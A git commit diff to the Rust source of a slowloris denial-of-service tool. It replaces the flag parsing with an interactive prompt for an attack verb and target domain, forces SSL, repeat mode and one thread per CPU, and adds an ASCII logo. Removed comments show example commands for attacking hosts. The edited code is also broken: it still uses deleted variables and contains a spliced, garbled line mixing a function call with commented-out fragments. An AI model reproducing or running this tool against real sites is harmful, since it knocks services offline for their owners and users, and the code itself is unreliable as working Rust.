e091050eacb7b31394fabb0a5b09951512e874a1
oneduck11034 <oneduck11034@gmail.com>
2024-10-15 03:41:49 +0900

    pakuring

--- ddos/src/main.rs
+++ ddos/src/main.rs
@@ -11,6 +11,7 @@ extern crate webpki;
 extern crate webpki_roots;
 
 use docopt::Docopt;
+use std::io::{stdin, BufRead};
 use std::net::TcpStream;
 use std::sync::Arc;
 use std::thread;
@@ -19,52 +20,55 @@ mod slowloris_attack;
 use slowloris_attack::slowloris_attack;
 
 // fix -> RustcDecodable
-#[derive(Debug)]
-struct Args {
-    arg_target: String,
-    flag_port: Option<usize>,
-    flag_timeout: u32,
-    flag_cycles: u32,
-    flag_ssl: bool,
-    flag_nofinalize: bool,
-    flag_domain: Option<String>,
-    flag_repeat: bool,
-    flag_threads: Option<usize>,
-    cmd_get: bool,
-    cmd_post: bool,
-}
-
-
-// Perform an attack against localhost, port 8000, using the POST verb: rloris post localhost --port=8000
-// Perform an SSL attack against example.com, port 443: rloris get example.com --ssl
-// Perform an SSL attack against 127.0.0.1, with domain name example.com: rloris get 127.0.0.1 --ssl --domain=example.com --repeat
+// #[derive(Debug)]
+// struct Args {
+//     arg_target: String,
+//     flag_port: Option<usize>,
+//     flag_timeout: u32,
+//     flag_cycles: u32,
+//     flag_ssl: bool,
+//     flag_nofinalize: bool,
+//     flag_domain: Option<String>,
+//     flag_repeat: bool,
+//     flag_threads: Option<usize>,
+//     cmd_get: bool,
+//     cmd_post: bool,
+// }
 
 fn main() {
-    // Set up logging
-    env_logger::init().unwrap();
-    debug!("Logging successfully initialized.");
-    // let args: Args = Docopt::new(USAGE)
-    //     .and_then(|d| d.decode())
-    //     .unwrap_or_else(|e| e.exit());
+    self::show_logo();
+
+    // 1 -> get
+    // 2 -> post
+    // set -> domain.com
+    // protocol
+
+    let (attack_option, domain)= self::input_domain_with_menu();
 
     // The default port is 80, but for SSL it's 443.
-    let default_port = if args.flag_ssl { 443 } else { 80 };
-    let port = args.flag_port.unwrap_or(default_port);
+    let default_port = 443; // or 80
 
-    let finalize = !args.flag_nofinalize;
-    let cycles = args.flag_cycles;
-    let timeout = args.flag_timeout;
-    let repeat = args.flag_repeat;
-    let threads = args.flag_threads.unwrap_or(num_cpus::get());
-    let ssl = args.flag_ssl;
-    let cmd_get = args.cmd_get;
-    let cmd_post = args.cmd_post;
+    let finalize = true;
+    // let cycles = args.flag_cycles;
+    let timeout = 15;
+    let repeat = true;
+    let threads = num_cpus::get();
+    let ssl = true; //default ssl true
+    let cmd_get= if attack_option == "get".to_string(){
+        true
+    }else { false};
+    let cmd_post=if attack_option == "post".to_string(){
+        true
+    }else {false};
+
     // Extract targetting information
     let mut target = Target::new(args.arg_target, port);
 
     // Check for domain override
     if let Some(domain) = args.flag_domain {
-        target.set_domain(&domain);
+        target.set_domain(&domain);= Docopt::new(USAGE)
+        //     .and_then(|d| d.decode())
+        //     .unwrap_or_e
     }
 
     // Set up rustls process global
@@ -132,4 +136,28 @@ fn main() {
             break;
         }
     }
+}
+
+pub fn show_logo(){
+    println!("--------------------------------------------------------------");
+    println!("d888888b  .d8b.  d888888b .d8888. db    db db    db  .d8b.");
+    println!("`~~88~~' d8' `8b `~~88~~' 88'  YP 88    88 `8b  d8' d8' `8b ");  
+    println!("   88    88ooo88    88    `8bo.   88    88  `8bd8'  88ooo88 ");
+    println!("   88    88~~~88    88      `Y8b. 88    88    88    88~~~88 ");
+    println!("   88    88   88    88    db   8D 88b  d88    88    88   88 ");
+    println!("   YP    YP   YP    YP    `8888Y' ~Y8888P'    YP    YP   YP ");
+    println!("--------------------------------------------------------------");
+}
+
+fn input_domain_with_menu() -> (String, String){
+    let std= stdin();
+    let mut buff= stdin().lock().lines();
+    let string_input= buff.next().unwrap().unwrap();
+    let input_v: Vec<String>= string_input.split_whitespace()
+        .map(|f| f.trim().to_string())
+        .collect();
+
+    let (attack_option, domain)= (input_v[0].clone(), input_v[1].clone()); 
+    
+    (attack_option, domain)
 }
